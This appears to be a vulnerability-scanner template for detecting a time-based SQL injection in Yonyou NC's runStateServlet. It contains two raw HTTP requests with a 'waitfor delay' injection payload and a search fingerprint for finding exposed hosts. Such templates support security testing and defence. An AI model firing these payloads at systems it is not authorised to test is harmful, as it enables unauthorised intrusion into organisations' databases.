http:
- matchers:
  - condition: and
    dsl:
    - duration>=5
    type: dsl
  raw:
  - '@timeout: 10s

    GET /portal/pt/servlet/runStateServlet/doPost?pageId=login&proInsPk=1''waitfor+delay+''0:0:6''--
    HTTP/1.1

    Host: {{Hostname}}

    '
  - '@timeout: 10s

    GET /portal/pt/servlet/runStateServlet/doPost?pageId=login&proDefPk=1''waitfor+delay+''0:0:6''--
    HTTP/1.1

    Host: {{Hostname}}

    '
  stop-at-first-match: true
id: yonyou-nc-runStateServlet-sqli
info:
  author: Co5mos
  description: Detects SQL Injection vulnerability in Yonyou NC runStateServlet.
  metadata:
    fofa-query: icon_hash="1085941792"
  name: Yonyou NC runStateServlet - SQL Injection
  reference: https://github.com/wy876/POC/commit/80042f9f89a2370ca1b6882a0bd075158e25c6cc
  severity: high
  tags: yonyou,sqli
